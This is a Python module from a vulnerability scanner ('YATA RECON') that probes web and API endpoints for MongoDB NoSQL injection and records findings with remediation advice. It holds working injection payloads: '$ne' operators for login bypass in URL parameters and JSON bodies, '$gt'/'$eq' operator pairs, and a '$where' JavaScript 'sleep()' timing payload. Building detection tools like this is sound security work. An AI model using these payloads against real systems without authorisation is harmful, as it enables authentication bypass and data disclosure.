"""
NoSQLModule — YATA RECON module.
Detects NoSQL injection via operator injection ($gt, $ne).
"""
import json
import time
import urllib.parse
import hashlib

try:
    import requests
except ImportError:
    requests = None

from recon.modules import BaseModule


def _qjoin(endpoint: str, query_suffix: str) -> str:
    """Append a raw query suffix to an endpoint that may already have its
    own query string (recon.py seeds endpoints like /index.php?id=1 —
    blindly appending '?param=value' would double up the '?' and the
    payload would never reach the target parameter)."""
    sep = "&" if "?" in endpoint else "?"
    return f"{endpoint}{sep}{query_suffix}"


class NoSQLModule(BaseModule):
    NAME = "NoSQL Injection"

    def run(self):
        self.ui.section("NoSQL Injection Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        s = self._session()
        found = 0
        # self.validator is provided by BaseModule.__init__ for every module.

        # API endpoints from an OpenAPI/Swagger spec (recon.py) — this is the
        # highest-signal path: real, confirmed JSON operations rather than a
        # keyword guess on the URL (the keyword filter below, e.g. requiring
        # "login"/"auth"/"user"/"search"/"api" in the endpoint string, would
        # have completely missed a real endpoint like POST /tokens — no match
        # on any of those substrings — which is exactly the class of endpoint
        # this vuln lives on in practice).
        found += self._test_api_endpoints(s)

        endpoints = [self.base_url] + self.ctx.get("endpoints", [])[:20]

        for endpoint in endpoints:
            # Skip likely static assets
            if endpoint.endswith((".jpg", ".png", ".js", ".css", ".html")):
                continue

            # We need endpoints that accept parameters. Let's test URL params and JSON body
            # For simplicity, we'll test common auth/search endpoints if present
            if any(x in endpoint for x in ["login", "auth", "search", "user", "api"]):
                # 1. URL Parameter Injection
                # Normally we'd look for ?user=admin. We simulate an injected request: ?user[$ne]=invalid
                payload_url = _qjoin(endpoint, "username[$ne]=yata-recon&password[$ne]=yata-recon")
                baseline_url = _qjoin(endpoint, "username=yata-recon&password=yata-recon")

                # Only report on a differential that REPRODUCES (payload re-sent
                # → identical, baseline re-sampled → stable). A single-shot
                # hash/length diff is the #1 NoSQL false-positive source: the
                # `[$ne]` bracket produces a differently-NAMED param that many
                # stacks simply ignore or reject, and any page with per-request
                # variation (CSRF nonce, timestamp, A/B content) trivially trips
                # a one-off diff. See _confirm_divergence.
                # require_status_change=True: `username[$ne]=x` is a DIFFERENTLY
                # NAMED param from `username=x`, so unless the stack parses the
                # bracket syntax into a Mongo operator, the baseline/payload
                # differ merely because `username` is present vs absent — a
                # reproducible content diff that is NOT injection. Demanding the
                # operator payload flip the status (rejection→success, the
                # actual auth-bypass signature) eliminates that structural FP.
                res = self._confirm_divergence(
                    lambda: self._safe_req(s, "GET", baseline_url),
                    lambda: self._safe_req(s, "GET", payload_url),
                    require_status_change=True,
                )
                if res:
                    self.db.add(
                        title="NoSQL Injection — Operator Injection in URL",
                        severity="high", url=endpoint, module=self.NAME,
                        description=(
                            "Endpoint exhibits a stable, reproducible behavior change when MongoDB "
                            "operators ($ne) are injected via query parameters (confirmed over a "
                            "repeat probe, with a stable benign baseline). This indicates the "
                            "parameter is passed to a NoSQL query rather than treated as an opaque value."
                        ),
                        remediation="Sanitize input and do not pass raw user input objects directly to NoSQL queries.",
                        cvss="8.5",
                        confidence="HIGH",
                        confidence_score=78,
                        validation_steps=["differential_reproduced", "baseline_stable"],
                        evidence=[f"Payload URL: {payload_url}"]
                    )
                    self.ui.find("high", "NoSQL Injection (URL)", endpoint)
                    found += 1

                # 2. JSON Body Injection (if endpoint accepts POST)
                json_payload = {"username": {"$ne": "yata-recon"}, "password": {"$ne": "yata-recon"}}
                json_baseline = {"username": "yata-recon", "password": "yata-recon"}
                headers = {"Content-Type": "application/json"}

                # require_status_change=True: the operator payload must turn a
                # rejection (e.g. 401 invalid-login) into a success (2xx) — the
                # signature of an actual auth-bypass — AND that must reproduce.
                res = self._confirm_divergence(
                    lambda: self._safe_req(s, "POST", endpoint, json_baseline, headers),
                    lambda: self._safe_req(s, "POST", endpoint, json_payload, headers),
                    require_status_change=True,
                )
                if res:
                    rb, rp = res
                    self.db.add(
                        title="NoSQL Injection — Operator Injection in JSON",
                        severity="critical", url=endpoint, module=self.NAME,
                        description=(
                            "Endpoint exhibits authentication bypass / data disclosure when MongoDB "
                            "operators are injected into a JSON body: the response status changed from "
                            f"{rb.status_code} (baseline) to {rp.status_code} (payload) and the change "
                            "reproduced on a repeat probe against a stable baseline."
                        ),
                        remediation="Sanitize input and enforce strict schema validation for JSON APIs.",
                        cvss="9.1",
                        confidence="CONFIRMED",
                        confidence_score=90,
                        validation_steps=["differential_reproduced", "status_change", "baseline_stable"],
                        evidence=[f"Payload: {json.dumps(json_payload)}"]
                    )
                    self.ui.find("critical", "NoSQL Injection (JSON)", endpoint)
                    found += 1

            time.sleep(self.delay)

        if found == 0:
            self.ui.info("No NoSQL Injection vulnerabilities detected.")

    @staticmethod
    def _safe_req(s, method, url, json_body=None, headers=None):
        try:
            if method == "GET":
                return s.get(url, timeout=10)
            return s.post(url, json=json_body, headers=headers, timeout=10)
        except Exception:
            return None

    def _confirm_divergence(self, send_baseline, send_payload, require_status_change=False):
        """Accept a baseline-vs-operator-payload divergence only if it
        REPRODUCES: the operator payload is re-sent (must return the same
        status + byte-structure) and the benign baseline is re-sampled (must
        be stable). This is the same reproduce-and-control discipline the
        SQLi/validator differential uses, applied to the crawled-endpoint
        NoSQL heuristics so a one-off difference from dynamic content can't
        confirm a finding. Returns (baseline_resp, payload_resp) or None."""
        def _h(r):
            return hashlib.md5((getattr(r, "text", "") or "").encode()).hexdigest()

        rb, rp = send_baseline(), send_payload()
        if rb is None or rp is None:
            return None
        base_h, pay_h = _h(rb), _h(rp)
        diverged = base_h != pay_h and abs(len(rb.text) - len(rp.text)) > 50
        if not diverged or rp.status_code not in (200, 201, 301, 302):
            return None
        if require_status_change and rb.status_code == rp.status_code:
            return None

        rp2, rb2 = send_payload(), send_baseline()
        if rp2 is None or rb2 is None:
            return None
        if _h(rp2) != pay_h or rp2.status_code != rp.status_code:
            return None  # operator response not deterministic → not injection
        if _h(rb2) != base_h:
            return None  # baseline itself unstable → can't trust the diff
        return rb, rp

    def _test_api_endpoints(self, s) -> int:
        """
        Test JSON body properties from an OpenAPI/Swagger spec for MongoDB
        operator injection.

        Earlier version routed this through Validator.differential_test with
        a plain-STRING baseline_value and an OBJECT-shaped operator payload.
        On any target with basic OpenAPI/JSON-schema request validation (very
        common — e.g. connexion, FastAPI, express-openapi-validator), sending
        an object where a string is declared gets rejected by the schema
        validator itself (400 "not of type 'string'") *regardless of whether
        a NoSQL backend exists at all*. That divergence from the string
        baseline was being reported as CRITICAL NoSQL injection — verified as
        a real false positive against a live (SQLite-backed, no NoSQL engine
        in sight) target this session: both operator probes below produced
        byte-for-byte-structurally-identical 400 schema-rejection responses.

        Fixed by comparing two OBJECT-shaped probes against each other (same
        JSON type as each other, so a type-only schema rejection treats both
        identically and produces no differential), varying only the
        operator's semantics: `$gt: ""` matches virtually any non-empty
        string if evaluated, `$eq: <impossible value>` matches nothing. A
        real difference between them can only come from the backend actually
        evaluating the operator — never from JSON-schema type validation.
        """
        found = 0
        auth_headers = self.ctx.get("auth_headers", {})

        for api_ep in self.ctx.get("api_endpoints", []):
            method = api_ep.get("method", "POST")
            url = api_ep.get("url")
            json_props = api_ep.get("json_props", [])
            if not url or not json_props:
                continue

            headers = dict(auth_headers)
            for name, example in api_ep.get("header_params", []):
                if example:
                    headers[name] = str(example)

            for prop in json_props:
                other = {p: "yata_recon_value" for p in json_props if p != prop}

                def send(op_value, _other=other, _prop=prop, _url=url, _method=method, _headers=headers):
                    body = {**_other, _prop: op_value}
                    try:
                        return s.request(_method, _url, json=body, headers=_headers, timeout=self.timeout)
                    except Exception:
                        return None

                true_resp  = send({"$gt": ""})
                false_resp = send({"$eq": "yata_recon_impossible_9f3ae2"})
                if true_resp is None or false_resp is None:
                    continue

                same_status = true_resp.status_code == false_resp.status_code
                same_shape  = (self.validator._structural_hash(true_resp.text) ==
                               self.validator._structural_hash(false_resp.text))
                if same_status and same_shape:
                    # Operator injection ($gt/$eq — object-shaped values)
                    # found nothing — try $where next. It's a COMPLETELY
                    # different technique: raw JavaScript as a plain STRING
                    # value (not an object), evaluated per-document by the
                    # MongoDB JS engine. A schema validator that correctly
                    # rejects wrong-TYPE values (defeating the operator
                    # technique above) does nothing to stop this, since the
                    # value's type is exactly what was declared (a string).
                    if self._test_where_time_based(s, url, method, prop, other, headers):
                        found += 1
                        if found > 5:
                            return found
                    continue  # operator technique never evaluated -> nothing more to check here

                # Confirm with a control repeat of the "true" probe before reporting.
                control_resp = send({"$gt": ""})
                if control_resp is None:
                    continue
                control_matches_true = (
                    control_resp.status_code == true_resp.status_code and
                    self.validator._structural_hash(control_resp.text) == self.validator._structural_hash(true_resp.text)
                )
                if not control_matches_true:
                    continue  # not stable -> don't report

                self.db.add(
                    title=f"NoSQL Injection — Operator Injection in '{prop}' (JSON body)",
                    severity="high", url=url, module=self.NAME,
                    description=(
                        f"JSON body property '{prop}' behaves differently, in a stable/repeatable "
                        "way, when sent a MongoDB query operator ($gt vs. $eq-impossible) instead "
                        "of a plain scalar — indicating the value is passed unsanitized into a "
                        "NoSQL query rather than being rejected by schema validation."
                    ),
                    remediation=(
                        "Enforce strict JSON schema validation — reject non-scalar (object/array) "
                        "values for fields that should only ever be strings/numbers — before "
                        "passing input to the query layer."
                    ),
                    cvss="8.5",
                    confidence="HIGH", confidence_score=80,
                    validation_steps=["operator_pair_differential", "control_repeat"],
                    evidence=[
                        f"$gt probe: status={true_resp.status_code}, {len(true_resp.text)}b",
                        f"$eq-impossible probe: status={false_resp.status_code}, {len(false_resp.text)}b",
                    ],
                )
                self.ui.find("high", f"NoSQL Injection via '{prop}' JSON body", url)
                found += 1

                if found > 5:
                    return found
        return found

    def _test_where_time_based(self, s, url, method, prop, other, headers) -> bool:
        """
        $where accepts raw JavaScript, evaluated server-side per document —
        a genuinely different NoSQL injection technique from operator
        injection, reachable via a plain STRING value rather than an
        object, so it isn't caught by strict type-schema validation that
        already defeated the $gt/$eq test above. sleep() in the MongoDB JS
        context causes a real, measurable server-side delay if — and only
        if — the value is actually evaluated as code rather than compared
        as an opaque string. Uses Validator.validate_time_based for the
        same statistical (Z-score) rigor every other time-based check in
        this codebase uses, instead of a single raw timing sample.
        """
        delay_sec = 4

        def send_fn(value, timeout):
            try:
                body = {**other, prop: value}
                return s.request(method, url, json=body, headers=headers, timeout=timeout)
            except Exception:
                return None

        # A JS string that's a harmless no-op comparison when treated as an
        # opaque string value, but a real sleep()-then-always-true
        # expression when evaluated as $where JavaScript.
        payload = f"sleep({delay_sec * 1000}) || true"

        try:
            result = self.validator.validate_time_based(
                url=url, param=prop, delay_payload=payload,
                expected_delay=delay_sec, baseline_value="yata_recon_value",
                timeout=self.timeout, send_fn=send_fn,
            )
        except Exception:
            return False

        if not (result.get("valid") and result.get("confidence_score", 0) >= 75):
            return False

        self.db.add(
            title=f"NoSQL Injection — $where JavaScript Evaluation in '{prop}' (JSON body)",
            severity="critical", url=url, module=self.NAME,
            description=(
                f"JSON body property '{prop}', sent as a plain string containing "
                f"'sleep({delay_sec * 1000}) || true', caused a statistically significant, "
                f"repeatable server-side delay (Z-score {result.get('z_score', 0):.1f}) — "
                "consistent with the value being passed into a MongoDB $where clause and "
                "evaluated as raw JavaScript rather than compared as an opaque string. This is "
                "a distinct technique from operator ($gt/$ne) injection and isn't stopped by "
                "type-only schema validation, since the value's type (string) is exactly what "
                "was expected."
            ),
            remediation=(
                "Never use $where or server-side JavaScript evaluation with user-controlled "
                "input. Use standard MongoDB query operators with properly typed/validated "
                "values instead."
            ),
            cvss="9.1",
            confidence="HIGH", confidence_score=result.get("confidence_score", 80),
            validation_steps=["where_time_based_z_score", "control_recovery"],
            evidence=[f"Payload: {payload}", result.get("details", "")],
        )
        self.ui.find("critical", f"NoSQL $where JS injection via '{prop}'", url)
        return True
